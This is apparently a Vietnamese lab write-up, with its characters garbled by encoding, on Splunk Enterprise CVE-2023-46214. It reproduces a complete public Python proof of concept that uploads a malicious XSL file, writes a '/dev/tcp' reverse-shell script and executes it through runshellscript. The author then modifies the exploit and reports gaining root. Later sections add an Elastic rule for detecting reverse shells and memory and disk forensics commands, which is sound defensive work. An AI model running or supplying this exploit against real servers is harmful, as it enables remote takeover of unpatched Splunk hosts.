# üè≥ CVE-2023-46214: Attack, Detect and Forensic

## M·ªü B√†i

## Th√¢n b√†i

### **Splunk Enterprise l√† g√¨?**

Trong th·∫ø gi·ªõi ƒë·∫ßy log v√† d·ªØ li·ªáu l·ªõn Splunk kh√¥ng ch·ªâ l√† m·ªôt ph·∫ßn m·ªÅm, m√† l√† m·ªôt c√¢y c·∫ßu k·∫øt n·ªëi gi·ªØa c√°c ·ª©ng d·ª•ng, h·ªá th·ªëng v√† thi·∫øt b·ªã h·∫° t·∫ßng m·∫°ng. Splunk kh√¥ng ch·ªâ t√¨m ki·∫øm v√† gi√°m s√°t, m√† c√≤n l√† c√¥ng c·ª• ƒë·ªÉ c√≥ th·ªÉ sƒÉn t√¨m nh·ªØng m·ªëi ƒëe d·ªça ƒë·ªëi v·ªõi t·ªï ch·ª©c.

<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

V·ªõi kh·∫£ nƒÉng linh ho·∫°t, Splunk c√≥ th·ªÉ c√¢n nhi·ªÅu lo·∫°i d·ªØ li·ªáu kh√°c nhau nh∆∞ Syslog, CSV, Apache-log, Access\_combined‚Ä¶ ƒëi·ªÅu n√†y khi·∫øn n√≥ tr·ªü th√†nh c√¥ng c·ª• m·∫°nh m·∫Ω. Splunk ƒë∆∞·ª£c x√¢y d·ª±ng tr√™n n·ªÅn t·∫£ng Lucene v√† MongoDB khi·∫øn splunk c√≥ th·ªÉ phi√™u l∆∞u trong th·∫ø gi·ªõi ph·ª©c t·∫°p c·ªßa log v√† th√¥ng tin m·∫°ng.

L√† m·ªôt SOC Analyst, m√¨nh ƒë√£ l√†m quen v·ªõi Splunk t·ª´ khi b∆∞·ªõc ch√¢n v√†o con ƒë∆∞·ªùng l√†m v·ªÅ Gi√°m s√°t b·∫£o m·∫≠t h·ªá th·ªëng. C√¥ng vi·ªác c·ªßa m√¨nh h·∫±ng ng√†y c√≥ th·ªÉ coi nh∆∞ h·∫ßu h·∫øt l√† l√†m vi·ªác v·ªõi Splunk ƒë·ªÉ c√≥ th·ªÉ gi√°m s√°t h·ªá th·ªëng, v√† ph√°t hi·ªán c√°c c·∫£nh b√°o b·∫£o m·∫≠t.

### C√†i ƒë·∫∑t v√† tri·ªÉn khai Splunk.

ƒê·ªÉ c√†i ƒë·∫∑t Splunk, m√¨nh s·ª≠ d·ª•ng m√¥i tr∆∞·ªùng Ubuntu Linux 20.04

C√°c b·∫°n c√≥ th·ªÉ download Splunk t·∫°i trang[https://www.splunk.com](https://www.splunk.com). Sau 7749 b∆∞·ªõc ƒëƒÉng k√≠ v√† nh·∫≠p th√¥ng tin th√¨ m√¨nh c√≥ ƒë∆∞·ªùng link download. ·ªû ƒë√¢y m√¨nh s·ª≠ d·ª•ng Splunk version 9.0.5 ƒë·ªÉ th·ª±c hi·ªán ch·∫°y CVE.

<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

Sau khi download th√†nh c√¥ng, m√¨nh ti·∫øn h√†nh c√†i ƒë·∫∑t package qua l·ªánh **apt install**. Splunk s·∫Ω ƒë∆∞·ª£c c√†i ƒë·∫∑t v√†o th∆∞ m·ª•c m·∫∑c ƒë·ªãnh l√† **/opt/splunk**.

<figure><img src=".gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

Ch·∫°y l·ªánh **/opt/splunk/bin/splunk start‚Äîaccept-license** ƒë·ªÉ ch·∫•p nh·∫≠n license

<figure><img src=".gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

Sau khi enter ‚Äòy‚Äô ƒë·ªÉ x√°c nh·∫≠n th√¨ Splunk s·∫Ω cho ta t·∫°o credentials cho admin account.

<figure><img src=".gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

Okey m·ªçi th·ª© ƒë√£ xong. Start splunk v√† access v√†o web interface th√¥i.

<figure><img src=".gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

### **CVE-2023-46214**

·ªû ph·∫ßn n√†y, m√¨nh ch·ªâ t·∫≠p trung ch·ªß y·∫øu v√†o t√¨m hi·ªÉu s∆° v·ªÅ c√°ch m√† CVE n√†y khai th√°c v√† t·∫≠n d·ª•ng l·ªó h·ªïng ƒë·ªÉ RCE v√†o h·ªá th·ªëng v√† ch·∫°y POC.

C√°c version Splunk b·ªã ·∫£nh h∆∞·ªüng b·ªüi CVE n√†y l√† d∆∞·ªõi 9.0.7 v√† 9.1.2.

L·ªó h·ªïng n√†y attack khai th√°c t·ª´ vi·ªác t·∫£i file malicious XSLT l√™n Splunk Enterprise c√≥ th·ªÉ d·∫´n t·ªõi vi·ªác remote code execution (RCE).

M√¨nh t√¨m hi·ªÉu v·ªÅ CVE-2023-46214 th√¥ng qua blogs n√†y [Analysis of CVE-2023-46214 + PoC (hrncirik.net)](https://blog.hrncirik.net/cve-2023-46214-analysis), v√† xem PoC n√†y l√†m nh·ªØng g√¨:

```python
#!/usr/bin/env python3

import argparse
import requests
import json

# proxies = {"http": "<http://127.0.0.1:8080>", "https": "<http://127.0.0.1:8080>"}
proxies = {}

def generate_malicious_xsl(ip, port):
    return f"""<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="<http://www.w3.org/1999/XSL/Transform>" xmlns:exsl="<http://exslt.org/common>" extension-element-prefixes="exsl">
  <xsl:template match="/">
    <exsl:document href="/opt/splunk/bin/scripts/shell.sh" method="text">
        <xsl:text>sh -i &gt;&amp; /dev/tcp/{ip}/{port} 0&gt;&amp;1</xsl:text>
    </exsl:document>
  </xsl:template>
</xsl:stylesheet>
"""

def login(session, url, username, password):
    login_url = f"{url}/en-US/account/login?return_to=%2Fen-US%2Faccount%2F"
    response = session.get(login_url, proxies=proxies)
    cval_value = session.cookies.get("cval", None)

    if not cval_value:
        return False

    auth_payload = {
        "cval": cval_value,
        "username": username,
        "password": password,
        "set_has_logged_in": "false",
    }

    auth_url = f"{url}/en-US/account/login"
    response = session.post(auth_url, data=auth_payload, proxies=proxies)
    return response.status_code == 200

def get_cookie(session, url):
    response = session.get(url, proxies=proxies)
    return response.status_code == 200

def upload_file(session, url, file_content, csrf_token):
    files = {'spl-file': ('shell.xsl', file_content, 'application/xslt+xml')}
    upload_headers = {
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0",
        "Accept": "text/javascript, text/html, application/xml, text/xml, */*",
        "X-Requested-With": "XMLHttpRequest",
        "X-Splunk-Form-Key": csrf_token,
    }

    upload_url = f"{url}/en-US/splunkd/__upload/indexing/preview?output_mode=json&props.NO_BINARY_CHECK=1&input.path=shell.xsl"
    response = session.post(upload_url, files=files, headers=upload_headers, verify=False, proxies=proxies)

    try:
        text_value = json.loads(response.text)['messages'][0]['text']
        if "concatenate" in text_value:
            return False, None
        return True, text_value
    except (json.JSONDecodeError, KeyError, IndexError):
        return False, None

def get_job_search_id(session, url, username, csrf_token):
    jsid_data = {'search': f'|search test|head 1'}
    jsid_url = f"{url}/en-US/splunkd/__raw/servicesNS/{username}/search/search/jobs?output_mode=json"
    upload_headers = {
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0",
        "X-Requested-With": "XMLHttpRequest",
        "X-Splunk-Form-Key": csrf_token,
    }
    response = session.post(jsid_url, data=jsid_data, headers=upload_headers, verify=False, proxies=proxies)
    try:
        jsid = json.loads(response.text)['sid']
        return True, jsid
    except (json.JSONDecodeError, KeyError, IndexError):
        return False, None

def trigger_xslt_transform(session, url, jsid, text_value):
    xslt_headers = {
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0",
        "X-Splunk-Module": "Splunk.Module.DispatchingModule",
        "Connection": "close",
        "Upgrade-Insecure-Requests": "1",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "X-Requested-With": "XMLHttpRequest",
    }
    exploit_endpoint = f"{url}/en-US/api/search/jobs/{jsid}/results?xsl=/opt/splunk/var/run/splunk/dispatch/{text_value}/shell.xsl"
    response = session.get(exploit_endpoint, verify=False, headers=xslt_headers, proxies=proxies)
    return response.status_code == 200

def trigger_reverse_shell(session, url, username, jsid, csrf_token):
    runshellscript_data = {'search': f'|runshellscript "shell.sh" "" "" "" "" "" "" "" "{jsid}" ""'}
    runshellscript_url = f"{url}/en-US/splunkd/__raw/servicesNS/{username}/search/search/jobs"
    upload_headers = {
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0",
        "X-Requested-With": "XMLHttpRequest",
        "X-Splunk-Form-Key": csrf_token,
    }
    response = session.post(runshellscript_url, data=runshellscript_data, headers=upload_headers, verify=False, proxies=proxies)
    return response.status_code == 201

def main():
    parser = argparse.ArgumentParser(description='Splunk CVE-2023-46214 RCE PoC')
    parser.add_argument('--url', required=True, help='Splunk instance URL')
    parser.add_argument('--username', required=True, help='Splunk username')
    parser.add_argument('--password', required=True, help='Splunk password')
    parser.add_argument('--ip', required=True, help='Reverse Shell IP')
    parser.add_argument('--port', required=True, help='Reverse Shell Port')

    args = parser.parse_args()

    session = requests.Session()

    print("[!] CVE: CVE-2023-46214")
    print("[!] Github: <https://github.com/nathan31337/Splunk-RCE-poc>")

    if not login(session, args.url, args.username, args.password):
        print("[-] Authentication failed")
        exit()

    print("[+] Authentication successful")

    print("[*] Grabbing CSRF token", end="\\r")
    if not get_cookie(session, f"{args.url}/en-US"):
        print("[-] Failed to obtain CSRF token")
        exit()

    print("[+] CSRF token obtained")

    csrf_token = session.cookies.get("splunkweb_csrf_token_8000", None)

    malicious_xsl = generate_malicious_xsl(args.ip, args.port)
    uploaded, text_value = upload_file(session, args.url, malicious_xsl, csrf_token)

    if not uploaded:
        print("[-] File upload failed")
        exit()

    print("[+] Malicious XSL file uploaded successfully")

    jsid_created, jsid = get_job_search_id(session, args.url, args.username, csrf_token)

    if not jsid_created:
        print("[-] Creating job failed")
        exit()

    print("[+] Job search ID obtained")

    print("[*] Grabbing new CSRF token", end="\\r")
    if not get_cookie(session, f"{args.url}/en-US"):
        print("[-] Failed to obtain CSRF token")
        exit()

    print("[+] New CSRF token obtained")

    if not trigger_xslt_transform(session, args.url, jsid, text_value):
        print("[-] XSLT Transform failed")
        exit()

    print("[+] Successfully wrote reverse shell to disk")
    if not trigger_reverse_shell(session, args.url, args.username, jsid, csrf_token):
        print("[-] Failed to execute reverse shell")
        exit()

    print("[+] Reverse shell executed! Got shell?")

if __name__ == "__main__":
    main()
```

ƒêi s∆° v·ªÅ ph√¢n t√≠ch code 1 ch√∫t, ƒë·∫ßu ti√™n l√† h√†m `generate_malicious_xsl()`

<figure><img src=".gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

H√†m n√†y t·∫°o ra m·ªôt ƒëo·∫°n m√£ XSL c√≥ ch·ª©c nƒÉng g·ª≠i m·ªôt y√™u c·∫ßu reverse shell ƒë·∫øn m√°y attacker v√† l∆∞u v√†o file `shell.sh` ·ªü path `/opt/splunk/bin/scripts/`.

H√†m `login()`

<figure><img src=".gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

H√†m n√†y ƒë∆°n gi·∫£n ch·ªâ l√† ƒëƒÉng nh·∫≠p v√†o trang Splunk s·ª≠ username v·ªõi password ƒë∆∞·ª£c truy·ªÅn v√†o.

Ti·∫øp theo l√† h√†m `upload_file()`

<figure><img src=".gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

ƒêo·∫°n n√†y th·ª±c hi·ªán vi·ªác up file revershell `shell.xsl` ƒë√£ t·∫°o l√™n server ·ªü path `/en-US/splunkd/__upload/indexing/preview` v√† g√°n n·ªôi dung c·ªßa shell.xsl v√†o `text_value`.

Next, `get_job_search_id()`

<figure><img src=".gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

H√†m n√†y t√≥m t·∫Øt l·∫°i l√† g·ª≠i m·ªôt y√™u c·∫ßu `POST` ƒë·∫øn **Splunk**, ph√¢n t√≠ch c√∫ ph√°p ph·∫£n h·ªìi json tr·∫£ v·ªÅ t·ª´ server, n·∫øu th√†nh c√¥ng n√≥ s·∫Ω truy c·∫≠p gi√° tr·ªã s·ªßa `sid` v√† g√°n v√†o `jsid`.

`trigger_xslt_transform()`

<figure><img src=".gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

S·ª≠ d·ª•ng m·ªôt y√™u c·∫ßu GET ƒë·ªÉ k√≠ch ho·∫°t qu√° tr√¨nh chuy·ªÉn ƒë·ªïi XSLT th√¥ng qua endpoint **`/en-US/api/search/jobs/{jsid}/results`**.

Cu·ªëi c√πng l√† h√†m `trigger_reverse_shell()`

<figure><img src=".gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

S·ª≠ d·ª•ng m·ªôt y√™u c·∫ßu POST ƒë·ªÉ th·ª±c hi·ªán l·ªánh shell script th√¥ng qua endpoint **`/en-US/splunkd/__raw/servicesNS/{username}/search/search/jobs`**. Command runshellscript l√† m·ªôt l·ªánh t√¨m ki·∫øm c√≥ kh·∫£ nƒÉng ch·∫°y l·ªánh shell tr·ª±c ti·∫øp t·ª´ m·ªôt t√¨m ki·∫øm Splunk.

T√≥m l·∫°i workflow c·ªßa PoC th·ª±c hi·ªán nh∆∞ sau:

1. X√°c th·ª±c v·ªõi user v√† password ƒë·ªÉ v√†o h·ªá th·ªëng Splunk
2. T·∫°o t·ªáp in XSL
3. T·∫£i t·ªáp tin XSL l√™n Splunk
4. T·∫°o 1 job search ID ƒë·ªÉ t√¨m ki·∫øm sid
5. Chuy·ªÉn ƒë·ªïi XSLT
6. Reverse shell

### C√†i ƒë·∫∑t Agent l√™n server ch·∫°y Splunk ƒë·ªÉ l·∫•y logs

Tr∆∞·ªõc khi ch·∫°y PoC ƒë·ªÉ RCE server th√¨ m√¨nh th·ª±c hi·ªán c√†i agent ƒë·ªÉ l·∫•y logs ƒë·ªÉ ph·ª•c v·ª• cho vi·ªác Detection.

M√¨nh s·ª≠ d·ª•ng Elastic Cloud ƒë·ªÉ monitor v√† c√†i Auditbeat l√™n server.

* Download v√† c√†i ƒë·∫∑t Auditbeat version l√™n server.

<figure><img src=".gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

* Th√™m [cloud.id](http://cloud.id) v√† cloud.auth v√†o **`/etc/auditbeat/auditbeat.yml`** ƒë·ªÉ set th√¥ng tin k·∫øt n·ªëi cho Elastic Cloud:

<figure><img src=".gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

* Setup Auditbeat

<figure><img src=".gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

* Start Auditbeat v√† check logs xem ƒë√£ nh·∫≠n data ch∆∞a

```jsx
sudo service auditbeat start
```

<figure><img src=".gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

Okey naiiiii.

### Run PoC

* Download PoC v·ªÅ b·∫±ng git clone

<figure><img src=".gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

Ch√∫ng ta c·∫ßn truy·ªÅn parameters nh∆∞ Splunk URL, username Splunk, passoword Splunk, IP v√† Port reverse shell

V√¨ m√°y m√¨nh ƒëang ch·∫°y local n√™n c·∫ßn d√πng ngrok ƒë·ªÉ tunel tcp ra ngo√†i

```jsx
ngrok tcp 444
```

<figure><img src=".gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

T·∫°o m·ªôt socket ƒë·ªÉ l·∫Øng nghe b·∫±ng netcat

<figure><img src=".gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>

Tr∆∞·ªõc khi ch·∫°y exploit m√¨nh th·ª±c hi·ªán capture network b·∫±ng SSH v√† Wireshark

<figure><img src=".gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

Nice, ch·∫°y PoC th√¥i

<figure><img src=".gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>

\[+] Authentication successful&#x20;

\[+] CSRF token obtained&#x20;

\[+] Malicious XSL file uploaded successfully

&#x20;\[+] Job search ID obtained

&#x20;\[+] New CSRF token obtained

&#x20;\[+] Successfully wrote reverse shell to disk

&#x20;\[+] Reverse shell executed!

And 1 century later

<figure><img src=".gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

\[+] Got shell??????????? Wtf sao kh√¥ng l√™n Shell ƒë∆∞·ª£c. Ho li shit :<<<<

M·ªçi workflow th√†nh c√¥ng h·∫øt r·ªìi m√† sao ch∆∞a l√™n shell ƒë∆∞·ª£c nh·ªâ. M√¨nh ti·∫øn h√†nh check l·∫°i code v√† debug 7749 b∆∞·ªõc

Check xem folder `/opt/splunk/bin/scripts/` file [shell.sh](http://shell.sh) ƒë√£ ƒë∆∞·ª£c load l√™n

<figure><img src=".gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>

Hmmm file shell ƒë√£ c√≥ nh∆∞ng t·∫°i sao kh√¥ng l√™n ƒë∆∞·ª£c m√† t√°c gi·∫£ c√≥ th·ªÉ RCE???

Sau 7749 b∆∞·ªõc th√¨ m√¨nh ph√°t hi·ªán do t√°c gi·∫£ k define `/bin/bash` l√™n ƒë·∫ßu file `shell.sh` n√™n khi th·ª±c hi·ªán l·ªánh v·ªÅ shell th√¨ n√≥ b·ªã failed

M√¨nh th√™m 2 d√≤ng code v√†o h√†m `generate_milicous_xsl()`

Define `#/bin/bash`

```jsx
<xsl:text>#!/bin/bash</xsl:text> #
```

\*\*`&#xa;`\*\*m·ªôt k√Ω t·ª± xu·ªëng d√≤ng (line feed) trong Unicode

```jsx
<xsl:text>&#xa;</xsl:text>
```

<figure><img src=".gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

Okay ch·∫°y l·∫°i PoC th√¥i.

<figure><img src=".gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>

Nice =)) M√¨nh ƒë√£ RCE th√†nh c√¥ng v√†o h·ªá th·ªëng v·ªõi quy·ªÅn root.

### Identification attack

#### Ph√°t hi·ªán s·ªõm cu·ªôc attack v·ªõi SIEM system

<figure><img src=".gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>

ƒê√¢y l√† logs m√† h·ªá th·ªëng ghi ƒë∆∞·ª£c t·ª´ cu·ªôc attack. B·∫Øt ƒë·∫ßu exploit t·ª´ 06:38:07 -> 06:38:37 m·∫•t kho·∫£ng 30s ƒë·ªÉ exploit v√†o h·ªá th·ªëng. Logs sinh ra tr√™n h·ªá th·ªëng g·ªìm ch·∫°y **runshellscript.py v√† shell.sh qua process bash v√† python3.7.**

V·ªõi vi·ªác c√†i ƒë·∫∑t rule detection [Potential Reverse Shell Activity via Terminal](https://www.elastic.co/guide/en/security/8.6/potential-reverse-shell-activity-via-terminal.html)  v√†o h·ªá th·ªëng c·∫£nh b√°o, khi CVE n√†y ƒë∆∞·ª£c ch·∫°y ta c√≥ th·ªÉ ph√°t hi·ªán th√¥ng qua vi·ªác ch·∫°y bash process

```
process where event.type in ("start", "process_started") and
  process.name in ("sh", "bash", "zsh", "dash", "zmodload") and
  process.args : ("*/dev/tcp/*", "*/dev/udp/*", "*zsh/net/tcp*", "*zsh/net/udp*") and

  /* noisy FPs */
  not (process.parent.name : "timeout" and process.executable : "/var/lib/docker/overlay*") and
  not process.command_line : ("*/dev/tcp/sirh_db/*", "*/dev/tcp/remoteiot.com/*", "*dev/tcp/elk.stag.one/*", "*dev/tcp/kafka/*", "*/dev/tcp/$0/$1*", "*/dev/tcp/127.*", "*/dev/udp/127.*", "*/dev/tcp/localhost/*") and
  not process.parent.command_line : "runc init"
```

### Digital Forensics

<figure><img src=".gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

#### Thu th·∫≠p memory

ƒê·ªÉ thu th·∫≠p memory dump, m√¨nh vi·∫øt bash script s·ª≠ dung LiME ƒë·ªÉ dump v√† c√†i ƒë·∫∑t c√°c package c·∫ßn thi·∫øt.

<figure><img src=".gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>

C·∫•p quy·ªÅn cho script v√† ti·∫øn h√†nh dump.

<figure><img src=".gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>

M√¨nh l∆∞u file memory dump v√†o th∆∞ m·ª•c **evidence + timestamp dump v√† c√≥ cal hash c·ªßa file mem ƒë·ªÉ ƒë·∫£m b·∫£o t√≠nh to√†n v·∫πn c·ªßa evidence.**

<figure><img src=".gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>

S·ª≠ d·ª•ng l·ªánh scp ƒë·ªÉ t·∫£i file t·ª´ server xu·ªëng local ƒë·ªÉ th·ª±c hi·ªán forensic.

```
scp -r root@188.166.234.203:/root/evidence_20231202_091131/ ./
```

<figure><img src=".gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>

#### Thu th·∫≠p Disk image

M√¨nh th·ª±c hi·ªán vi·ªác sao l∆∞u m·ªôt ph√¢n v√πng (`/dev/vda1`) b·∫±ng c√°ch s·ª≠ d·ª•ng `dd`, n√©n d·ªØ li·ªáu b·∫±ng `gzip` ghi v√†o file backup.gz

```
ssh root@188.166.234.203 "dd if=/dev/vda1 bs=4M | gzip -9 -" | pv -ptebar -s $((25 * 1024 * 1024 * 1024)) | dd of=backup.gz
```

<figure><img src=".gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>

tobecontinue

## K·∫øt b√†i

![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/d3dfca9a-0219-4e0a-b396-f6b6974e7f16/80667438-0ae1-4b9d-9553-b8cb0044cbcc/Untitled.png)

#### Collection
